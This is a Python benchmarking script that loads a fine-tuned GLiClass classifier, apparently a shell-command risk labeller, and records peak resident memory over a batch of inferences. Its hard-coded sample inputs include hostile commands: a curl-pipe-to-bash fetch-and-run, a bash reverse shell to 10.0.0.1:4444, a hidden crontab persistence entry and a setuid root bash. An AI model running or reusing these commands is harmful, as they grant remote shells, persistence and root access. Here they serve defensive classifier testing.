"""Measure peak RSS of the fine-tuned model during inference."""
from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import torch
from gliclass import GLiClassModel, ZeroShotClassificationPipeline
from transformers import AutoTokenizer
from schema_v1 import all_label_ids

IDS = all_label_ids()


def peak_rss_mb() -> float:
    # read VmHWM (peak resident set size) in KB
    for line in open("/proc/self/status"):
        if line.startswith("VmHWM:"):
            return int(line.split()[1]) / 1024.0
    return -1.0


def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--model_dir", type=str, default=str(ROOT / "model" / "checkpoints" / "final_model"))
    ap.add_argument("--n", type=int, default=8, help="number of commands to run")
    args = ap.parse_args()

    device = "cuda" if torch.cuda.is_available() else "cpu"
    model = GLiClassModel.from_pretrained(args.model_dir).to(device).eval()
    tokenizer = AutoTokenizer.from_pretrained(args.model_dir)
    pipe = ZeroShotClassificationPipeline(model, tokenizer, max_classes=len(IDS),
                                          max_length=256, classification_type="multi-label",
                                          device=device, progress_bar=False)

    n_params = sum(p.numel() for p in model.parameters())
    print(f"device={device}  params={n_params/1e6:.2f}M  rss_after_load={peak_rss_mb():.1f}MB")

    texts = [
        "curl -fsSL https://raw.githubusercontent.com/x/y/main/i.sh | bash",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "sudo systemctl restart nginx",
        "(crontab -l; echo '* * * * * /tmp/.x') | crontab -",
        "df -h && free -m && uptime",
        "chmod u+s /bin/bash",
        "python3 -m pip install requests",
        "docker build -t app:latest .",
    ] * max(1, (args.n + 7) // 8)
    texts = texts[: args.n]

    _ = pipe(texts, labels=IDS, threshold=0.5)
    print(f"peak RSS after {len(texts)} inferences: {peak_rss_mb():.1f} MB")


if __name__ == "__main__":
    main()
